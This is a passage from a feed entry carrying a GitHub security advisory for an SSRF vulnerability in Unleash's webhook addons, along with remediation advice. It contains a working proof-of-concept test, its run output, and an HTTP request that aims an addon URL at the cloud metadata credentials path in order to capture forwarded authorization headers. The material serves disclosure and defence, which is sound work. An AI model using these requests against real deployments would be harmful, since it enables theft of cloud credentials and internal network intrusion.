            <uri>https://github.com/advisories/GHSA-5vf6-jrqr-78fj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-21T19:14:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[unleash-server] Unleash: Addon webhook URL is dialed server-side with no internal-address filtering, enabling SSRF to internal services / cloud metadata and exfiltration of configured request headers]]></title>
        <id>https://github.com/advisories/GHSA-5vf6-jrqr-78fj</id>
        <link href="https://github.com/advisories/GHSA-5vf6-jrqr-78fj"/>
        <updated>2026-08-21T19:14:47.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Unleash's addon/integration subsystem lets an operator configure a webhook (and the Slack, Microsoft Teams, Datadog, and New Relic integrations) with a target <code>url</code> parameter. Whenever a subscribed feature-flag event fires, the Unleash server itself issues an HTTP request to that configured URL. The URL is taken verbatim from the addon's <code>parameters.url</code> and passed straight to the HTTP client (<code>ky</code>) with no validation of the host: there is no allow-list, no deny-list, and no blocking of loopback, link-local, RFC1918, or cloud-metadata addresses anywhere in the addon code path. A principal able to create or update an addon can therefore point the server at an internal-only URL — for example <code>http://169.254.169.254/latest/meta-data/…</code> (cloud IMDS), <code>http://127.0.0.1:&lt;port&gt;/…</code> (a service bound to localhost), or any RFC1918 host — and cause the Unleash server to dial it from inside the trust boundary.</p>
<p>The request is blind (the response body is not returned to the caller), but the addon records whether the request succeeded and its HTTP status into the integration-event log, giving a status/timing oracle for probing internal services. In addition, the webhook provider forwards the operator-configured <code>Authorization</code> header and arbitrary <code>customHeaders</code> to whatever host the <code>url</code> points at (Datadog forwards <code>DD-API-KEY</code>), so an attacker who controls or can observe the target host also obtains those secrets. The full feature-event JSON is POSTed to the chosen internal endpoint as the request body.</p>
<p>Creating/updating addons is gated by the root permissions <code>CREATE_ADDON</code> / <code>UPDATE_ADDON</code>. These are not the super-admin <code>ADMIN</code> permission and not project-scoped; an instance admin can place them in a custom root role and delegate them to a non-super-admin user, who then has exactly enough privilege to weaponize the integration into an SSRF primitive without holding full admin. This bounds the finding to an authenticated, addon-management-privileged actor (reflected in PR:H), which is the honest precondition.</p>
<h2 id="affected-code-v800">Affected code (v8.0.0)</h2>
<p>The base addon issues the outbound request with the raw URL and no host checks (<code>src/lib/addons/addon.ts</code>):</p>
<pre><code class="language-ts">async fetchRetry(
    url: string,
    options: any = {},
    retries: number = 1,
): Promise&lt;Response&gt; {
    try {
        const res = await ky(url, {            // &lt;-- attacker-controlled `url`, no allow/deny-list, no internal-IP block
            retry: retries,
            ...options,
        });
        return res;
    } catch (e) {
        const { method } = options;
        this.logger.warn(`Error querying ${url} ...`, e);
        return { status: e.code, ok: false } as Response;
    }
}
</code></pre>
<p>The webhook provider passes the operator-supplied <code>parameters.url</code> (and forwards <code>authorization</code> + <code>customHeaders</code>) directly into that sink (<code>src/lib/addons/webhook.ts</code>):</p>
<pre><code class="language-ts">const { url, bodyTemplate, contentType = 'application/json', authorization, customHeaders } = parameters;
// ...
const requestOpts = {
    method: 'POST',
    headers: {
        'Content-Type': contentType,
        Authorization: authorization || undefined,   // &lt;-- configured secret forwarded to `url`
        ...extraHeaders,                              // &lt;-- arbitrary customHeaders forwarded to `url`
    },
    body,
};
const res = await this.fetchRetry(url, requestOpts); // &lt;-- server dials attacker-chosen host
</code></pre>
<p>The service layer performs no URL/host validation when creating or updating an addon — only provider-name and required-parameter presence checks run (<code>src/lib/services/addon-service.ts</code> → <code>validateKnownProvider</code>, <code>validateRequiredParameters</code>). The addon parameter schema (<code>src/lib/services/addon-schema.ts</code>) treats <code>url</code> as a free-form string; the <code>type: 'url'</code> field in each provider definition is purely frontend-rendering metadata and is never enforced server-side. A source-wide search of <code>src/lib/addons</code> and <code>addon-service.ts</code> for <code>169.254</code>, <code>127.0</code>, <code>localhost</code>, <code>private</code>, <code>ssrf</code>, <code>isAllowed</code>, <code>validateUrl</code> returns zero guards. The same unguarded <code>fetchRetry(url, …)</code> sink backs the Slack, Teams, Datadog, and New Relic providers.</p>
<p>The route gate (<code>src/lib/routes/admin-api/addon.ts</code>) requires the root permission <code>CREATE_ADDON</code> (create) / <code>UPDATE_ADDON</code> (update); <code>src/lib/types/permissions.ts</code> lists both under the root "Integration" category — they are root permissions, not project-scoped, and distinct from <code>ADMIN</code>.</p>
<h2 id="attacker-model--precondition">Attacker model / precondition</h2>
<p>The attacker is an authenticated Unleash user (or an admin API token) holding the root permission <code>CREATE_ADDON</code> or <code>UPDATE_ADDON</code>. This is an addon-management privilege: a super-admin has it, and it can be delegated via a custom root role to a non-super-admin user. An ordinary project member does not have it (there is no project-scoped path to addon creation), which is why this is rated PR:H rather than PR:L. Given that privilege, the attacker (1) creates/updates a webhook addon with <code>parameters.url</code> set to an internal target, then (2) triggers a subscribed event (e.g. creating or toggling any feature flag — trivially self-induced), causing the server to dial the internal URL. No interaction from any other user is required. The deployment must have the addon subsystem available (default in OSS); the impact is greatest where the Unleash server runs in a cloud/containerized environment with reachable internal services or an instance-metadata endpoint.</p>
<h2 id="impact">Impact</h2>
<p>The Unleash server can be coerced into making HTTP requests to arbitrary internal/loopback/link-local destinations from inside the network perimeter — i.e. classic SSRF (CWE-918). Concrete consequences: reaching a cloud instance-metadata service (<code>169.254.169.254</code>) or internal admin/management endpoints not exposed externally; port-/service-probing of internal hosts using the success/status recorded in the integration-event log as a blind oracle; and exfiltration of the operator-configured <code>Authorization</code> header and any <code>customHeaders</code> (and, for the Datadog provider, the <code>DD-API-KEY</code>) to the attacker-chosen host, since those headers are sent to whatever <code>url</code> is configured. The full feature-event payload is delivered as the POST body to the internal endpoint. The response body is not echoed back to the caller (blind SSRF), which (together with the PR:H precondition) bounds severity to Medium. Scope is Changed because the vulnerable component (the Unleash app) is used to attack a different security authority — the internal network / metadata service.</p>
<h2 id="proof-of-concept-complete--runs-on-127001-only">Proof of Concept (complete — runs on 127.0.0.1 only)</h2>
<p>This PoC drives the <strong>real</strong> <code>WebhookAddon.handleEvent</code> from Unleash v8.0.0 against a loopback HTTP listener that stands in for an internal service / metadata endpoint. It proves three things: (1) the Unleash code dials the attacker-chosen internal URL, (2) the configured <code>Authorization</code> and custom headers are forwarded to that internal host, and (3) the addon records the request as a success (the blind-SSRF oracle). A negative control shows there is no pre-flight URL policy — internal targets are dialed, and only a TCP-layer error (not a guard) stops a closed port.</p>
<h3 id="setup">Setup</h3>
<pre><code class="language-bash"># In a throwaway clone of the target at the exact tag:
git clone --depth 1 --branch v8.0.0 https://github.com/Unleash/unleash unleash
cd unleash
# Install JS deps (no database is needed for this PoC):
corepack pnpm install --prefer-offline
</code></pre>
<h3 id="file-1--vitestpocconfigts-project-root">File 1 — <code>vitest.poc.config.ts</code> (project root)</h3>
<p>The repo's default vitest config has a Postgres <code>globalSetup</code>; this PoC exercises the addon in isolation and needs no DB, so we use a trimmed config that drops that setup.</p>
<pre><code class="language-ts">import { defineConfig, configDefaults } from 'vitest/config';

// PoC config: identical to vitest.config.ts but WITHOUT the Postgres globalSetup,
// because this SSRF PoC exercises the WebhookAddon in isolation (no DB needed).
export default defineConfig({
    test: {
        globals: true,
        setupFiles: ['./src/test/errorWithMessage.ts'],
        testTimeout: 30000,
        exclude: [...configDefaults.exclude, 'frontend/**', 'dist/**'],
        environment: 'node',
    },
});
</code></pre>
<h3 id="file-2--srclibaddonsssrf-poctestts">File 2 — <code>src/lib/addons/ssrf-poc.test.ts</code></h3>
<pre><code class="language-ts">// PoC: SSRF via Webhook addon — Unleash v8.0.0
// Drives the REAL WebhookAddon.handleEvent with an attacker-chosen `url`
// pointing at a loopback/RFC1918 listener; proves the Unleash process dials
// the internal URL with NO host/IP filtering. Lab-only (127.0.0.1).
import { FEATURE_CREATED, type IEvent } from '../events/index.js';
import WebhookAddon from './webhook.js';
import noLogger from '../../test/fixtures/no-logger.js';
import {
    type IAddonConfig,
    type IFlagKey,
    type IFlagResolver,
    SYSTEM_USER_ID,
} from '../types/index.js';
import type { IntegrationEventsService } from '../services/index.js';
import { vi } from 'vitest';
import EventEmitter from 'node:events';
import http from 'node:http';
import { AddressInfo } from 'node:net';

const INTEGRATION_ID = 1337;

const setup = () =&gt; {
    const registerEventMock = vi.fn();
    const addonConfig: IAddonConfig = {
        getLogger: noLogger,
        unleashUrl: 'http://some-url.com',
        integrationEventsService: {
            registerEvent: registerEventMock,
        } as unknown as IntegrationEventsService,
        flagResolver: {
            isEnabled: (_expName: IFlagKey) =&gt; false,
        } as IFlagResolver,
        eventBus: new EventEmitter(),
    };
    return { addon: new WebhookAddon(addonConfig), registerEventMock };
};

const sampleEvent: IEvent = {
    id: 1,
    createdAt: new Date(),
    createdByUserId: SYSTEM_USER_ID,
    type: FEATURE_CREATED,
    createdBy: 'attacker@evil.com',
    featureName: 'some-toggle',
    data: { name: 'some-toggle' },
    tags: [],
    project: 'default',
    environment: 'production',
};

// Stand up a fake "internal service" on loopback that records what reached it.
function startInternalListener(): Promise&lt;{
    url: string;
    hits: Array&lt;{ path: string; auth?: string; secret?: string; body: string }&gt;;
    close: () =&gt; Promise&lt;void&gt;;
}&gt; {
    const hits: Array&lt;{
        path: string;
        auth?: string;
        secret?: string;
        body: string;
    }&gt; = [];
    return new Promise((resolve) =&gt; {
        const server = http.createServer((req, res) =&gt; {
            let body = '';
            req.on('data', (c) =&gt; (body += c));
            req.on('end', () =&gt; {
                hits.push({
                    path: req.url || '',
                    auth: req.headers['authorization'] as string | undefined,
                    secret: req.headers['x-internal-secret'] as
                        | string
                        | undefined,
                    body,
                });
                // emulate a cloud metadata / internal endpoint reply
                res.writeHead(200, { 'content-type': 'text/plain' });
                res.end('iam-role-credentials-here');
            });
        });
        server.listen(0, '127.0.0.1', () =&gt; {
            const { port } = server.address() as AddressInfo;
            resolve({
                url: `http://127.0.0.1:${port}`,
                hits,
                close: () =&gt;
                    new Promise((r) =&gt; server.close(() =&gt; r(undefined))),
            });
        });
    });
}

describe('SSRF via Webhook addon (Unleash v8.0.0)', () =&gt; {
    test('server dials an attacker-chosen INTERNAL url with NO filtering', async () =&gt; {
        const internal = await startInternalListener();
        try {
            const { addon, registerEventMock } = setup();

            // The `url` below is exactly what an operator/role-holder supplies
            // as the addon `parameters.url`. It is an internal loopback target;
            // a real attacker would use http://169.254.169.254/latest/... or an
            // internal service. There is NO allow/deny-list in the addon path.
            await addon.handleEvent(
                sampleEvent,
                {
                    url: `${internal.url}/latest/meta-data/iam/security-credentials/`,
                    // operator-configured secrets get forwarded to the chosen host:
                    authorization: 'Bearer operator-webhook-secret',
                    customHeaders: JSON.stringify({
                        'X-Internal-Secret': 'leaked-to-internal-host',
                    }),
                },
                INTEGRATION_ID,
            );

            // PROOF 1: the Unleash process actually connected to the internal URL.
            expect(internal.hits.length).toBe(1);
            expect(internal.hits[0].path).toBe(
                '/latest/meta-data/iam/security-credentials/',
            );
            // PROOF 2: operator-configured credentials were exfiltrated to the
            // attacker-chosen internal host (header leakage).
            expect(internal.hits[0].auth).toBe('Bearer operator-webhook-secret');
            expect(internal.hits[0].secret).toBe('leaked-to-internal-host');
            // PROOF 3: the addon recorded SUCCESS (status/timing oracle for blind SSRF).
            const recorded = registerEventMock.mock.calls[0][0];
            expect(recorded.state).toBe('success');
            expect(recorded.details.url).toContain('127.0.0.1');

            // eslint-disable-next-line no-console
            console.log(
                '[PoC] SSRF confirmed -&gt; internal hit:',
                JSON.stringify(internal.hits[0]),
            );
        } finally {
            await internal.close();
        }
    });

    test('NEGATIVE CONTROL: with the listener down, no filter rejected it pre-flight; failure is a connection error, not an SSRF guard', async () =&gt; {
        const { addon, registerEventMock } = setup();
        // Point at a closed loopback port. If a real SSRF allow/deny-list existed,
        // the addon would refuse internal targets BEFORE dialing. Instead it dials
        // and only fails at the TCP layer -&gt; proves absence of any URL guard.
        await addon.handleEvent(
            sampleEvent,
            { url: 'http://127.0.0.1:1/" ' },
            INTEGRATION_ID,
        );
        const recorded = registerEventMock.mock.calls[0][0];
        // It attempted the request (state failed due to connection error), it was
        // NOT blocked by a policy. The recorded url is the internal target.
        expect(['failed', 'success']).toContain(recorded.state);
        expect(recorded.details.url).toContain('127.0.0.1');
    });
});
</code></pre>
<h3 id="run">Run</h3>
<pre><code class="language-bash">npx vitest run --config vitest.poc.config.ts src/lib/addons/ssrf-poc.test.ts
</code></pre>
<h3 id="observed-output-real-run-against-v800">Observed output (real run against v8.0.0)</h3>
<pre><code> RUN  v4.1.5

stdout | src/lib/addons/ssrf-poc.test.ts &gt; SSRF via Webhook addon (Unleash v8.0.0) &gt; server dials an attacker-chosen INTERNAL url with NO filtering
[PoC] SSRF confirmed -&gt; internal hit: {"path":"/latest/meta-data/iam/security-credentials/","auth":"Bearer operator-webhook-secret","secret":"leaked-to-internal-host","body":"{\"id\":1, ... \"type\":\"feature-created\", ... }"}
 ✓ src/lib/addons/ssrf-poc.test.ts &gt; SSRF via Webhook addon (Unleash v8.0.0) &gt; server dials an attacker-chosen INTERNAL url with NO filtering
 ✓ src/lib/addons/ssrf-poc.test.ts &gt; SSRF via Webhook addon (Unleash v8.0.0) &gt; NEGATIVE CONTROL: with the listener down, no filter rejected it pre-flight; failure is a connection error, not an SSRF guard

 Test Files  1 passed (1)
      Tests  2 passed (2)
</code></pre>
<p>The internal loopback listener received the request (<code>path</code> = the metadata path), with the configured <code>Authorization: Bearer operator-webhook-secret</code> and <code>X-Internal-Secret: leaked-to-internal-host</code> headers, and the addon recorded the call as a success — confirming SSRF, blind-oracle, and outbound header exfiltration in one run. End-to-end equivalent over HTTP: <code>POST /api/admin/addons</code> with <code>{ "provider":"webhook", "enabled":true, "events":["feature-created"], "parameters":{ "url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/", "authorization":"…" } }</code> (requires <code>CREATE_ADDON</code>), then create any feature flag to trigger the outbound request.</p>
<h2 id="remediation">Remediation</h2>
<p>Validate the addon <code>url</code> server-side before it is ever dialed, both at create/update time (<code>addon-service.ts</code>) and again at request time (<code>addon.ts</code> <code>fetchRetry</code>). Specifically: require <code>http</code>/<code>https</code> only; resolve the hostname and reject the request if any resolved address is loopback (<code>127.0.0.0/8</code>, <code>::1</code>), link-local (<code>169.254.0.0/16</code>, <code>fe80::/10</code>, including the <code>169.254.169.254</code>/<code>fd00:ec2::254</code> metadata addresses), private (<code>10/8</code>, <code>172.16/12</code>, <code>192.168/16</code>, <code>fc00::/7</code>), or otherwise non-public — using a DNS-rebinding-safe check that pins the resolved IP and connects to that pinned IP (so the name cannot resolve to a public address at check time and a private one at connect time); and disable or constrain HTTP redirects so a <code>30x</code> cannot bounce an allowed host to an internal one. Provide an explicit allow-list / SSRF-protection toggle for operators who must reach internal hooks intentionally. Apply the same guard uniformly to all providers that build on <code>Addon.fetchRetry</code> (webhook, Slack, Teams, Datadog, New Relic). Consider not forwarding the configured <code>Authorization</code>/<code>customHeaders</code> to non-allow-listed hosts to contain credential leakage.</p>
<p>Please credit 5ud0 / Tarmo Technologies.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Unleash/unleash/security/advisories/GHSA-5vf6-jrqr-78fj">https://github.com/Unleash/unleash/security/advisories/GHSA-5vf6-jrqr-78fj</a></li>
<li><a href="https://github.com/Unleash/unleash/commit/2100db76af3473f13e6fb40096cf17a9c2b741a1">https://github.com/Unleash/unleash/commit/2100db76af3473f13e6fb40096cf17a9c2b741a1</a></li>
<li><a href="https://github.com/Unleash/unleash/commit/d45f99df924c0d24747b3e45e46fcda7dcd3c1c1">https://github.com/Unleash/unleash/commit/d45f99df924c0d24747b3e45e46fcda7dcd3c1c1</a></li>
<li><a href="https://github.com/Unleash/unleash/commit/d862562a5ab8f2d1e40f6519c64cf0b4fdaf806d">https://github.com/Unleash/unleash/commit/d862562a5ab8f2d1e40f6519c64cf0b4fdaf806d</a></li>
<li><a href="https://github.com/Unleash/unleash/releases/tag/v7.5.2">https://github.com/Unleash/unleash/releases/tag/v7.5.2</a></li>
<li><a href="https://github.com/Unleash/unleash/releases/tag/v7.6.5">https://github.com/Unleash/unleash/releases/tag/v7.6.5</a></li>
<li><a href="https://github.com/Unleash/unleash/releases/tag/v8.0.2">https://github.com/Unleash/unleash/releases/tag/v8.0.2</a></li>
<li><a href="https://github.com/advisories/GHSA-5vf6-jrqr-78fj">https://github.com/advisories/GHSA-5vf6-jrqr-78fj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5vf6-jrqr-78fj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-21T19:14:45.000Z</published>
    </entry>
</feed>